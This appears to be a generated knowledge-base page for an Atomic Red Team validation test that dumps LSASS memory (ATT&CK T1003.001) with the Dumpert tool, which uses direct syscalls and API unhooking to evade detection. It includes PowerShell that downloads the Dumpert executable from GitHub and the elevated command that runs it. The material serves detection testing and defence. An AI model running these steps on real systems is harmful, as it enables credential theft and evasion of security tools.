---
atomic_guid: "7ae7102c-a099-45c8-b985-4c7a2d05790d"
title: "Dump LSASS.exe Memory using direct system calls and API unhooking"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "7ae7102c-a099-45c8-b985-4c7a2d05790d"
  - "Dump LSASS.exe Memory using direct system calls and API unhooking"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Dump LSASS.exe Memory using direct system calls and API unhooking

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
https://github.com/outflanknl/Dumpert
https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.

If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.

## Metadata

- Atomic GUID: 7ae7102c-a099-45c8-b985-4c7a2d05790d
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Input Arguments

### dumpert_exe

- description: Path of Dumpert executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe

## Dependencies

Dumpert executable must exist on disk at specified location (#{dumpert_exe})

### Prerequisite Check

```powershell
if (Test-Path "#{dumpert_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory (Split-Path "#{dumpert_exe}") -Force | Out-Null
Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile "#{dumpert_exe}"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"#{dumpert_exe}"
```

### Cleanup

```cmd
del C:\windows\temp\dumpert.dmp >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
